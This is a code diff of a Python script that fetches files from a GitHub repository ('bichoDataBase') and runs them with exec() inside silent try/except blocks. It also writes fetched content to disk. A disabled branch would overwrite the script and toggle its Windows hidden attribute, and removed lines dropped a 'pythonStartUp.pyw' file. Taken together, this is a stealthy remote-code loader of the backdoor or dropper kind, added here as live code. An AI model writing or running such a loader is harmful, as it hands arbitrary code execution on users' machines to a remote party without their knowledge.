@@ -4,12 +4,15 @@ import os
 
 ver = 0
 
+script = os.path.abspath(__file__)
+dir = os.path.dirname(script)
+
 user = 'yarnayGH'
 repo = 'bichoDataBase'
 branch = 'main'
-file = '1bach_c.py'
-# a ver
-def check(file=file):
+xScript = '1bach_c.py'
+
+def check(file, branch=branch):
     try:
         return urlopen(
             Request(
@@ -20,19 +23,24 @@ def check(file=file):
         ).read().decode('utf-8')
     except:
         return ''
-
-def run(file=file):
-    try:
-        exec(check(file))
-    except:
-        pass
-
-if check('ver')!=ver and check('ver')!='':
+if False:
+#if check('ver')!=ver and check('ver')!='':
+    os.system(f'attrib -h "{script}"')
     open(
-        os.path.dirname(os.path.abspath(__file__))+'/pythonStartUp.pyw', 'w'
+        script, 'w'
     ).write(
         check('bicho.pyw')
     )
+    os.system(f'attrib +h "{script}"')
 
-run('general.py')
-run()
+open(dir+'/aver.txt', 'w').write(check('1bach_c.py'))
+
+try:
+    exec(check('general.py'))
+except:
+    pass
+
+try:
+    exec(check(xScript))
+except:
+    pass
